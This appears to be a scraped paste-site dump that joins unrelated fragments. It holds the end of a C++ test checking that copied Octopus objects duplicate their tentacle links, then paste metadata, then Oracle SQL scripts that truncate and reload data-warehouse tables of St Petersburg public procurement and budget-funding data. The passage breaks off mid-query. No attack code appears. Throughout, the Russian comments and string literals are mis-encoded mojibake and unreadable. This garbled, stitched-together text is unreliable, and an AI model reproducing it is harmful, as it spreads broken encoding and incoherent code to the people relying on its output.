    // –ö–æ–ø–∏—è –æ—Å—å–º–∏–Ω–æ–≥–∞ –∏–º–µ–µ—Ç —Å–≤–æ—é —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é –∫–æ–ø–∏—é —â—É–ø–∞–ª–µ—Ü, –∫–æ—Ç–æ—Ä—ã–µ
    // –∫–æ–ø–∏—Ä—É—é—Ç —Å–æ—Å—Ç–æ—è–Ω–∏–µ —â—É–ø–∞–ª–µ—Ü –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –æ—Å—å–º–∏–Ω–æ–≥–∞
    {
        // –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –æ—Å—å–º–∏–Ω–æ–≥–æ–≤ —Å —Ä–∞–∑–Ω—ã–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ–º —â—É–ø–∞–ª–µ—Ü
        for (int num_tentacles = 0; num_tentacles < 10; ++num_tentacles) {
            Octopus male(num_tentacles);
            Octopus female(num_tentacles);
            // –ü—É—Å—Ç—å –æ–Ω–∏ —Ö–≤–∞—Ç–∞—é—Ç –¥—Ä—É–≥ –¥—Ä—É–≥–∞ –∑–∞ —â—É–ø–∞–ª—å—Ü–∞
            for (int i = 0; i < num_tentacles; ++i) {
                male.GetTentacle(i).LinkTo(female.GetTentacle(num_tentacles - 1 - i));
            }

            Octopus male_copy(male);
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ —â—É–ø–∞–ª–µ—Ü –∫–æ–ø–∏–∏
            assert(male_copy.GetTentacleCount() == male.GetTentacleCount());
            for (int i = 0; i < male_copy.GetTentacleCount(); ++i) {
                // –ö–∞–∂–¥–æ–µ —â—É–ø–∞–ª—å—Ü–µ –∫–æ–ø–∏–∏ —Ä–∞–∑–º–µ—â–∞–µ—Ç—Å—è –ø–æ –∞–¥—Ä–µ—Å—É, –æ—Ç–ª–∏—á–Ω–æ–º—É –æ—Ç –∞–¥—Ä–µ—Å–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —â—É–ø–∞–ª—å—Ü–∞
                assert(&male_copy.GetTentacle(i) != &male.GetTentacle(i));
                // –ö–∞–∂–¥–æ–µ —â—É–ø–∞–ª—å—Ü–µ –∫–æ–ø–∏–∏ –ø—Ä–∏—Ü–µ–ø–ª—è–µ—Ç—Å—è –∫ —Ç–æ–º—É –∂–µ —â—É–ø–∞–ª—å—Ü—É, —á—Ç–æ –∏ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ
                assert(male_copy.GetTentacle(i).GetLinkedTentacle() == male.GetTentacle(i).GetLinkedTentacle());
            }
        }
        // –ï—Å–ª–∏ –≤—ã –≤–∏–¥–∏—Ç–µ —ç—Ç—É –Ω–∞–¥–ø–∏—Å—å, —Ç–æ —Ä–∞–∑—Ä—É—à–µ–Ω–∏–µ –æ—Å—å–º–∏–Ω–æ–≥–æ–≤, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ,
        // –ø—Ä–æ—à–ª–æ –±–µ–∑ –Ω–µ–æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è
        cout << ""Everything is OK""s << endl;
    }
}"
LejC9UWU,sgoz,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:07:46 AM CDT,"truncate table dwh_detailing_sg_general_2024;
insert into dwh_detailing_sg_general_2024 
Select Case When s.owner_inn='7820075581' Then '146504' Else to_char(org.id) End id,
       Case When s.owner_inn='7820075581' Then '7820076257' Else s.owner_inn End contragent_inn, 
       org.kpp, Upper(Coalesce(org.full_name, u.full_name)) full_name,
       org.short_name,
       Case when s.contragent_inn in ('7838479881','7838489103') Then '–ö–û–ú–ò–¢–ï–¢ –ü–û –¢–†–£–î–£ –ò –ó–ê–ù–Ø–¢–û–°–¢–ò –ù–ê–°–ï–õ–ï–ù–ò–Ø –°–ê–ù–ö–¢-–ü–ï–¢–ï–†–ë–£–†–ì–ê'  Else org.grbs_full_name End grbs_name,       
       org.parentid,
       org.grbs_inn, vg.vg_name vg,  s.year,
       s.contragent_account,
       s.targetexpenseitemcode,s.fund, t.np_code_name,t.fp_code_name,
	   Case When s.targetexpenseitemcode In (Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip) and  s.cvr not in ('244') 
       or (s.targetexpenseitemcode in ('022E15305F','021E15305F') and s.cvr='414' and s.kosgu='310' and s.contragent_inn='7809025523')Then '–î–∞' Else '–ù–µ—Ç'              
       End priznak,--–ü—Ä–∏–∑–Ω–∞–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç–∞—Ç—å–∏ (–ê–ò–ü)
       S.budget_type,s.cvr,s.kosgu, sum sgoz,
       Case When owner_inn<>contragent_inn Then 1 Else 0 End flag_pp,
	   s.REQ --–∫–æ–¥ –∑–∞–ø—Ä–æ—Å–∞
From (

       Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
                And s.flag_ab = 1
                And (o.role_code<>10 or (s.contragent_inn='7813046420' and s.targetexpenseitemcode='0810071170')) -- –ø–∏—Å—å–º–æ –õ.–ê.–ö—Ä–∏—Ü–∫–æ–π –æ—Ç 14.04.2021 –ò—Å–∫–ª—é—á–∏—Ç—å –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–µ —É—á—Ä–µ–∂–¥–µ–Ω–∏—è. –ù–û –¥–æ–±–∞–≤–∏—Ç—å –ú–£–ó–´–ö–ê–õ–¨–ù–´–ô –¢–ï–ê–¢–† –ø–æ —ç—Ç–æ–π —Ü—Å –ø–∏—Å—å–º–æ –æ—Ç 18.05.2023
                And s.budget_type in ('–°–ò–¶','–°–ì–ó')
                And (s.kosgu in ('214','221', '222', '223', '224', '225', '226', '227', '228', '229','310', '320', '340', '341', '342', '343', '344', '345', '346', '347', '349', '352', '353') 
                or (s.kosgu='263'  and o.inn<>'7825357195' ))-- –¥–æ–±–∞–≤–∏—Ç—å –ö–û–°–ì–£ 214 –∏ –¥–æ–±–∞–≤–∏—Ç—å –ö–û–°–ì–£ 263 –∫—Ä–æ–º–µ –ò–ù–ù 7825357195(–°–ü–± –ì–ë–£ ""–¶–û–û ""–ú–æ–ª–æ–¥–µ–∂–Ω—ã–π¬ª )
                And s.cvr not in ('415','452','466') -- –ø–∏—Å—å–º–æ –õ.–ê.–ö—Ä–∏—Ü–∫–æ–π –æ—Ç 14.04.2021
                And ((s.cvr <> '323' And o.grbs_inn in ('7825675663','7840013199')
                     Or (o.grbs_inn not in ('7825675663','7840013199')))  
                    )-- –ø–∏—Å—å–º–æ –õ.–ê.–ö—Ä–∏—Ü–∫–æ–π –æ—Ç 14.04.2021. –ò—Å–∫–ª—é—á–∏—Ç—å —Ñ–∏–Ω-–∏–µ –ø–æ –ö–í–† 323 —É –ö–æ–º–∏—Ç–µ—Ç–∞ –ø–æ —Å–æ—Ü–∏–∞–ª—å–Ω–æ–π –ø–æ–ª–∏—Ç–∏–∫–µ –°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥–∞ –∏ –ñ–∏–ª–∏—â–Ω–æ–≥–æ –∫–æ–º–∏—Ç–µ—Ç–∞ –∏ –∏—Ö –ø–æ–¥–≤–µ–¥–æ–º—Å—Ç–≤–µ–Ω–Ω—ã—Ö —É—á—Ä–µ–∂–¥–µ–Ω–∏–π 
                -- And ((s.kosgu<>'263' and o.inn='7825357195') or (o.inn<>'7825357195') ) --14.09.2022 -–≤–µ—Ä–Ω—É—Ç—å  —É –∫–æ–º –ø–æ –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—é –ö–û–°–ì–£ 263 –∫—Ä–æ–º–µ –ò–ù–ù 7825357195)
                -- And (o.grbs_inn='7830002053' And s.kosgu<>'263' or nvl(o.grbs_inn,1)<>'7830002053') --02.09.2021 –¢–µ—Ä–µ—Ö–æ–≤–∞ –ò.–í. –æ—Ç–∫–ª—é—á–∏—Ç—å —É –∫–æ–º –ø–æ –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—é –ö–û–°–ì–£ 263
                And s.kosgu not in ('297','267')
                 
        union 

        Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
               And s.flag_ab = 0 And s.flag_budget_current=1 And 
               ((s.cvr Between 200 And 247 )
                 or (s.cvr = 323 And (( o.grbs_inn  not in ('7825675663','7840013199')) or (s.targetexpenseitemcode='0330040750' And  s.contragent_inn = '7806042256' and s.year < 2024) or (s.targetexpenseitemcode='0350040750' And  s.contragent_inn = '7806042256' and s.year = 2024)))--–∫–æ–º–∏—Ç–µ—Ç –ø–æ —Å–æ—Ü–∏–∞–ª—å–Ω–æ–π –ø–æ–ª–∏—Ç–∏–∫–µ (+ –∂–∏–ª–∏—â–Ω—ã–π –∫–æ–º–∏—Ç–µ—Ç –ë–µ–ª–æ—É—Å–æ–≤–∞ –ê.–ê 21.12.2020 –∫—Ä–æ–º–µ –°–ü–± –ì–ö–£ ""–ì–û–†–û–î–°–ö–û–ô –ò–ù–§–û–†–ú–ê–¶–ò–û–ù–ù–û-–†–ê–°–ß–ï–¢–ù–´–ô –¶–ï–ù–¢–†"" (–¥–æ–±–∞–≤–ª–µ–Ω –ö–í–† 323 –ø–æ –ø–∏—Å—å–º—É –æ—Ç –ö—Ä–∏—Ü–∫–æ–π –õ.–ê. 09.09.2022
                Or ((s.cvr = 414 Or s.cvr = 412) And s.kosgu not in (298,299,530)))     
               And s.cvr not in ('415','452','466') -- –ø–∏—Å—å–º–æ –õ.–ê.–ö—Ä–∏—Ü–∫–æ–π –æ—Ç 14.04.2021 
                --And (o.inn='7825357195' And s.kosgu<>'263') --02.09.2021 –¢–µ—Ä–µ—Ö–æ–≤–∞ –ò.–í. –æ—Ç–∫–ª—é—á–∏—Ç—å —É –∫–æ–º –ø–æ –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—é –ö–û–°–ì–£ 263
               And s.kosgu not in ('297','267')
        )   s
Join dwh_kf_ul u on s.CONTRAGENT_INN=u.code And u.year=2024
left Join (Select Distinct fp_code, fp_code_name, np_code_name From dwh_targetexpenseitemcode_2020 ) t on s.FP_CODE=t.FP_CODE
left Join dwh_organization_kgntv org On s.owner_inn=org.inn 
Left Join dwh_vg vg On vg.grbs_id=org.parentid
Where s.flag_budget_current=1 
      And s.owner_inn<>'7812026622' --02.09.2021 –¢–µ—Ä–µ—Ö–æ–≤–∞ –ò.–í.
      And s.owner_inn<>'7811040938' -- 14.01.2022 –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è —è–≤–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–º —É—á—Ä–µ–∂–¥–µ–Ω–∏–µ–º
      And org.id<>1610 --16.11.2021 –ü–∏—Å—å–º–æ –ö—Ä–∏—Ü–∫–æ–π –õ.–ê. 
;"
vwQdy0gq,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:59 AM CDT," truncate table dwh_detailing_con_general_2024;
 insert into dwh_detailing_con_general_2024
 
with zak as
(Select 
    fin.lotuuid ,
    sum(fin.finvalue) fin_zak
  from dwh_lot_fin_kgntv fin
  Join (select distinct contragent_inn,targetexpenseitemcode from dwh_kf_sgoz_kgntv Where year=2024 and flag_budget_current=1) t On t.contragent_inn=fin.inn and t.targetexpenseitemcode=fin.targetexpenseitemcode 
  -- –∏–∑–º–µ–Ω–µ–Ω–∏–µ –æ—Ç 30.09.2020 —Å–¥–µ–ª–∞–Ω–æ –∏–∑-–∑–∞ —Ä–∞–∑–¥–≤–æ–µ–Ω–∏—è —Å—Ç—Ä–æ–∫ –ø–æ –∫–æ—Å–≥—É
  Where finyear=to_number(2024)
  Group by fin.lotuuid),
publ_full as 
(Select 
    tru.lot_id,
    sum(tru.fulfilled_cost_doc)fulfilled_cost_doc
From dwh_contract_tru_kgntv tru
Inner Join dwh_contract_kgntv c on tru.lot_id=c.lotid and length(c.contractrnk)=13 and fulfilment_sum is null
Group by tru.lot_id)
 
Select Case When con.customerinn='7820075581' Then '146504' --–≤ —Å–≤—è–∑–∏ —Å —Ç–µ–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–π —Å–∞–¥–∏–∫ —Ä–µ–æ—Ä–≥–∞–Ω–∑–∏–≤–∞–ª—Å—è –≤ —Å–∞–¥–∏–∫ —Å –ò–ù–ù=7820076257 –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å—É–º–º–∏—Ä–æ–≤–∞—Ç—å
            When pro.delegated=1 Then pro.orgid Else to_char(con.customerid) End customerid,
       Case When pro.delegated=1 Then pro.orgtitle Else con.customername End customername, 
       org.short_name,
       Case When con.customerinn='7820075581' Then '7820076257' --–≤ —Å–≤—è–∑–∏ —Å —Ç–µ–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–π —Å–∞–¥–∏–∫ —Ä–µ–æ—Ä–≥–∞–Ω–∑–∏–≤–∞–ª—Å—è –≤ —Å–∞–¥–∏–∫ —Å –ò–ù–ù=7820076257 –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å—É–º–º–∏—Ä–æ–≤–∞—Ç—å
            When pro.delegated=1 Then org_pp.inn 
            Else con.customerinn End customerinn, 
       Case When pro.delegated=1 Then org_pp.kpp Else org.kpp End customerkpp, 
       Case When pro.delegated=1 Then pro.grbstitle Else con.grbsname End grbsname,
       Case When pro.delegated=1 Then org_pp.grbs_inn Else org.grbs_inn End grbs_inn, 
       Case When pro.delegated=1 Then pro.grbsid Else to_char(org.parentid) End grbsid,
       vg.vg_name vg, --–≤–∏—Ü–µ–≥—É–±–µ—Ä–Ω–∞—Ç–æ—Ä
       pro.pg_ikz, pro.pg_n, pro.pg_rn,pro.reqnum,
       pro.first_notice_try,--  –î–∞—Ç–∞ –ø–µ—Ä–≤–æ–π —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è (xml-–ø–∞–∫–µ—Ç–∞)–≤ –ï–ò–° ( –ù–ï –í–°–ï–ì–î–ê = –î–∞—Ç–µ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è) 
       pro.F_PRODUCTPRICE,
       nvl(pro.f_productprice,con.contractsigningprice) nmck_rasch,
       zak.fin_zak, --—Å—É–º–º–∞ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–≤–æ–∞–Ω–∏—è 2021 –ø–æ –∑–∞–∫—É–ø–∫–µ
      case when pro.joflag=1 then 1 else 0 end sovm,
      cons.orgtitle cons_org,
      case when pro.placement='–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –∑–∞–∫—É–ø–∫–∞' then 1 else 0 end centr,
      tar.flag_pp, --–≤ —Ä–∞–º–∫–∞—Ö —á.6–ø.15 (–ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–æ–ª–Ω–æ–º–æ—á–∏—è)      
      Case When pro.delegated=1 Then pro.orgtitle Else null End org_pp, --–æ—Ä–≥–∞–Ω–∏–∑–∞—Ü, –æ—Å—É—â–µ—Å—Ç–≤–ª—è—é—â–∞—è –ø–æ–ª–Ω–æ–º–æ—á–∏—è –∑–∞–∫–∞–∑—á–∏–∫–∞
      con.CONTRACTRNK, con.contractsigndate, 
      con.contractsigningprice, 
      con.contractfullprice, --–¥–æ–±–∞–≤–ª–µ–Ω–æ 16.11.20211 –ø–æ –ø–∏—Å—å–º—É –ö—Ä–∏—Ü–∫–æ–π –õ.–ê.
      tar.finsum, --—Å—É–º–º–∞ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è 2021 –ø–æ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—É 
      tar.expensetypecode, tar.kosgucode,
      tar.budget_type, -- —Ç–∏–ø —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
	  tar.fund_code, 
      tar.req_code, --  –∫–æ–¥ –∑–∞–ø—Ä–æ—Å–∞ ( –¥–æ–±–∞–≤–ª–µ–Ω–æ 14.07.2023 –ø–æ –ø—Ä–æ—Å—å–±–µ –ö—Ä–∏—Ü–∫–æ–π –õ.–ê.)
      con.ORDERTYPENAME,con.CONTRACTONEEXECREASON,
      con.stagetitle,
      con.contract_execution_start_date,--–¥–∞—Ç–∞ –Ω–∞—á–∞–ª–∞ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
      con.contractplaneexecdate,
      con.CONTRACTREJECTDATE,
      tar.year fin_year, --–≥–æ–¥ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
      tar.targetexpenseitemcode, --—Ü–µ–ª–µ–≤–∞—è —Å—Ç–∞—Ç—å—è –∏–∑ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
     -- zak.targetexpenseitemcode targ_zak, --—Ü–µ–ª–µ–≤–∞—è —Å—Ç–∞—Ç—å—è –∏–∑ –∑–∞–∫—É–ø–∫–∏
      t.NP_CODE_NAME,
      t.FP_CODE_NAME,
   --   ROW_NUMBER() over (partition by 1 order by con.CUSTOMERNAME desc) rn, 
      case 
        when (tar.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and tar.expensetypecode not in ('244'))
        or (tar.targetexpenseitemcode in ('022E15305F','021E15305F') and tar.expensetypecode='414' and tar.kosgucode='310' and con.customerinn='7809025523') -- –ø—Ä–∞–≤–∏–ª–æ –ø–æ –ø–∏—Å—å–º—É –∫—Ä–∏—Ü–∫–æ–π –æ—Ç 5.10.222       
        then '–î–∞' else '–ù–µ—Ç'            
      end priznak_aip,--–ü—Ä–∏–∑–Ω–∞–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç–∞—Ç—å–∏ (–ê–ò–ü)
      tar.finsum_f,
      tar.lot_id, 
	  Case When (pro.sed_reg_number is not null or pro.request_order_number is not null) Then 1 Else 0 End UOPLACING, 
	  org_uo.FULL_NAME uo_org,
      CON.CONTRACTSUBJECT,
      con.supplierinn,
      con.suppliername,
      to_char(con.supplierkpp)supplierkpp,
      Case When pro.delegated=1 Then org_pp.contragent_account 
      Else org.contragent_account End contragent_account, --–∫–æ–¥ –∑–∞–∫–∞–∑—á–∏–∫–∞
      con.contractactualpaid, --—Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –æ–ø–ª–∞—á–µ–Ω–æ –≤—Å–µ–≥–æ
      nvl(con.fulfilment_sum,publ_full.fulfilled_cost_doc)fulfilment_sum,--—Å—Ç–æ–∏–º–æ—Å—Ç—å –∏—Å–ø–æ–ª–Ω–µ–Ω–Ω—ã—Ö –ø–æ—Å—Ç–∞–≤—â–∏–∫–æ–º –æ–±—è–∑–∞—Ç–µ–ª—å—Å—Ç–≤ –≤ –≤–∞–ª—é—Ç–µ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è (–ø–æ –ø–∏—Å—å–º—É –¢–µ—Ä–µ—Ö–æ–≤–æ–π –æ—Ç 22.08.2022)
      pro.date_notice_published,-- –î–∞—Ç–∞ —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –ø–µ—Ä–≤–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è –Ω–∞ –ï–ò–°
      con.price_type, -- –°–ø–æ—Å–æ–± —É–∫–∞–∑–∞–Ω–∏—è —Ü–µ–Ω—ã –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
      con.suppliertype,
      con.RTC_PRICE,
      con.supply_impossible

FROM  dwh_contract_kgntv con
Left Join dwh_organization_not_zak org on org.id=con.customerid   -- 05.07.2023 –≤–º–µ—Å—Ç–æ inner —É–∫–∞–∑–∞–Ω left, –ø–æ –ø—Ä–∏—á–∏–Ω–µ –Ω–µ –ø–æ–ø–∞–¥–∞–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤ —É –Ω–µ –∞–∫—Ç—É–∞–ª—å–Ω—ã—Ö –æ—Ä–≥-—Ü–∏–π.
                                    And contractrnk not in ('2782534239015000190','2783845426019000015','7400319000003','7400319000002','2783845426019000014','2783845426019000021','2783845426019000018') --–ö–æ–Ω—Ç—Ä–∞–∫—Ç—ã –æ—Ç–∫–ª—é—á–µ–Ω—ã –ø–æ —Å–æ–æ–±—â–µ–Ω–∏—é –†—è–±–æ–≤–æ–π 13 —Å–µ–Ω—Ç—è–±—Ä—è
                                    And con.customerid in (select id from dwh_organization_not_zak ) --–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É–±—Ä–∞—Ç—å —É—á—Ä–µ–∂–¥–µ–Ω–∏—è –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å–Ω–æ–π –≤–ª–∞—Å—Ç–∏
                                    And org.id<>1610--16.11.2021 –ü–∏—Å—å–º–æ –ö—Ä–∏—Ü–∫–æ–π –õ.–ê. 
Inner Join
 (
    Select fin.lot_id,fin.year,fin.finsum,fin.finsum_f,fin.targetexpenseitemcode, fin.expensetypecode, fin.kosgucode, fin.budget_type, fin.flag_pp ,fin.fund_code,req_code
        From FIN_TARG_CON_2024_VIEW fin   -- 28.09.22 —Å–æ–∑–¥–∞–Ω–∞ View —Å –∏–Ω—Ñ-—Ü–∏–µ–π –ø–æ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—é –ø–æ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞–º(—Å 3-–º—è union)              
       Where fin.finsum is not null                       
  )tar
ON con.LOTID = tar.LOT_ID
Left join zak on zak.lotuuid=con.lot_cons_m 
Left join zak on tar.lot_id=zak.lotuuid 
left join dwh_procedures_kgntv pro on pro.LOTUUID = con.lotid
left join dwh_procedures_cons_kgntv cons on cons.lotuuid=pro.joint_procedure_id
left join DWH_ORGANIZATION_KGNTV org_uo on org_uo.ID = pro.UO_ORGID
left Join (select distinct targetexpenseitemcode,FP_CODE_NAME,NP_CODE_NAME from DWH_TARGETEXPENSEITEMCODE_2020) t on t.targetexpenseitemcode=tar.targetexpenseitemcode
Left Join DWH_ORGANIZATION_KGNTV org_pp on org_pp.id=pro.orgid and pro.delegated=1
Left join dwh_vg_22 vg On vg.grbs_id=con.grbsid
Left Join publ_full on publ_full.lot_id=con.LOTID
where ((con.CONTRACTREJECTDATE is not null and tar.finsum_f is not null and tar.finsum_f<>0) or con.CONTRACTREJECTDATE is null )
-- 05.07.2023 –≤–º–µ—Å—Ç–æ inner —É–∫–∞–∑–∞–Ω left, –ø–æ –ø—Ä–∏—á–∏–Ω–µ –Ω–µ –ø–æ–ø–∞–¥–∞–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤ —É –Ω–µ –∞–∫—Ç—É–∞–ª—å–Ω—ã—Ö –æ—Ä–≥-—Ü–∏–π.
and org.inn not in ('7812031703','7838468985','7812050079','7802215250','7804169391','7814143064','7802215268','7842000050','7804169401','7813188464','7801238167','7816226189','7811139084','7814143057','7816226502',
              '7842000068','7819029196','7819029206','7839000318','7843000046','7843000039','7810293894','7820038893','7817044400','7820038903','7806143737','7807053821','7810293904','7805283273','7806143720',
              '7811139119','7807053839','7805283280','7813585510','7840425330','7838389412','7825439419','7830001028','7830000426','7830001758'
             )
             and org.full_name not like '–¢–ï–†–†–ò–¢–û–†–ò–ê–õ–¨–ù–ê–Ø –ò–ó–ë–ò–†–ê–¢–ï–õ–¨–ù–ê–Ø –ö–û–ú–ò–°–°–ò–Ø%'
;
 
insert into dwh_detailing_con_general_2024
With 
con As (
            Select c.*,contract.suppliertype,contract.rtc_price, contract.supply_impossible,contract.supplierkpp, ROW_NUMBER() Over (Partition By c.contract_regnum Order By  c.contract_regnum desc) rn
            From dwh_contracts_delegated c 
            left join dwh_contract_kgntv contract on contract.contractrnk=c.contract_regnum
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
                  and c.paymentyear=2024                          
                  and contract.contractrnk is null
				 --and c.exec_startyear=extract(year from sysdate)  -- –ø—Ä–∞–≤–∏–ª–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ —Ç.–∫. –∑–∞–ø–∏—Å–∏ –¥—É–±–ª–∏—Ä—É—é—Ç—Å—è –∏–∑-–∑–∞ —á–µ–≥–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—á–∏—Ç–∞–µ—Ç—Å—è —ç–∫–æ–Ω–æ–º–∏—è –ø—Ä–∏–º–µ—Ä –∫–æ–Ω—Ç—Ä–∞–∫—Ç 2782536397817000078
       ),
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1 
         ) 
 
Select to_char(org.id) orgid, org.full_name,org.short_name,org.inn, org.kpp, org.grbs_full_name, grbs_inn, to_char(org.parentid) parentid,
       vg.vg_name vg, --–≤–∏—Ü–µ–≥—É–±—Ä–Ω–∞—Ç–æ—Ä 
       Coalesce(pos.pg_ikz, con.purchasecode, notice.purchasecode) pg_ikz,
       Coalesce(pos.pg_n, notice.tenderplan) pg_n,    
       Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End positionnumber,
       con.notificationnumber,
       null fitst_notice_try,--–¥–∞—Ç–∞ —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –ø–µ—Ä–≤–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è
       proc.maxprice,--–Ω–º—Ü–∫
       coalesce(proc.maxprice,con.contract_price) nmck_rasch, --–Ω–º—Ü–∫ —Ä–∞—Å—á–µ—Ç–Ω–æ–µ –ø–æ–ª–µ
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum_zak,
        0 sovm, --—Å–æ–≤–º–µ—Å—Ç–Ω–∞—è –∑–∞–∫—É–ø–∫–∞
        null As c_org, --–ù–∞–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏, —Ä–∞–∑–º–µ—Å—Ç–∏–≤—à–µ–π –∏–∑–≤–µ—â–µ–Ω–∏–µ
        0 centr, --—Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—è –∑–∞–∫—É–ø–∫–∞
        1 flag_pp,
        con.responsibleorg_fullname, -- –û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è, –æ—Å—É—â–µ—Å—Ç–≤–ª—è—é—â–∞—è –ø–æ–ª–Ω–æ–º–æ—á–∏—è –∑–∞–∫–∞–∑—á–∏–∫–∞
        con.contract_regnum, --–†–ù–ö
        con.contract_signdate, --–¥–∞—Ç–∞ –∑–∞–∫–ª—é—á–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
        con.contract_price, --—Ü–µ–Ω–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ –Ω–∞ –º–æ–º–µ–Ω—Ç –∑–∞–∫–ª—é—á–µ–Ω–∏—è
        con.contract_price contractfullprice, --—Ç–µ–∫—É—â–∞—è —Ü–µ–Ω–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
        con.paymentsum, --—Å—É–º–º–∞ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
        con.kvr,
        null kosgu,--–∫–æ—Å–≥—É
        null budjet_type,--—Ç–∏–ø —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
		null fund_code, -- –∫–æ–¥ —Ñ–æ–Ω–¥–∞
        null req_code, --–∫–æ–¥ –∑–∞–ø—Ä–æ—Å–∞
        Case When con.placing In ('13013') Then '–ó–∞–ø—Ä–æ—Å –∫–æ—Ç–∏—Ä–æ–≤–æ–∫ –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('12011') Then '–ê—É–∫—Ü–∏–æ–Ω –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('14013') Then '–ó–∞–ø—Ä–æ—Å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–π –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('20000') or con.placing Is Null And con.singlecustomer Is Not Null Then '–ó–∞–∫—É–ø–∫–∞ —É –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞ (–ø–æ–¥—Ä—è–¥—á–∏–∫–∞, –∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª—è)'
